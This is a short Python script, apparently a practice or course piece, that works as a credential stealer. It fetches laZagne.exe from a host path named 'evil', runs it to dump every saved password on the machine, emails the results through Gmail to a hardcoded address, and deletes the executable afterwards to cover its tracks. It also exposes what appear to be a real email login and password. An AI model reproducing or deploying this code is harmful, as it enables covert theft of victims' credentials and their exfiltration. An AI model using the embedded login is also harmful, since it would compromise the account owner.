#!/usr/bin/env python

import requests, subprocess, smtplib, os, tempfile

def send(email,password,message):
    server = smtplib.SMTP("smtp.gmail.com", 587)
    server.starttls() #Inititate Connection
    server.login(email,password)
    server.sendmail(email,email,message)
    server.quit()

def getFile(url):
    getRequest = requests.get(url)
    fileName = url.split("/")[-1]
    with open(fileName, "wb") as output:
        output.write(getRequest.content)
temp_dir = tempfile.gettempdir()
os.chdir(temp_dir)
getFile("http://10.0.2.15/evil/laZagne.exe")
result = subprocess.check_output("lazagne.exe all", shell=True)
send("eqan.ahmad123@gmail.com", "6nov2001", result)
os.remove("laZagne.exe")

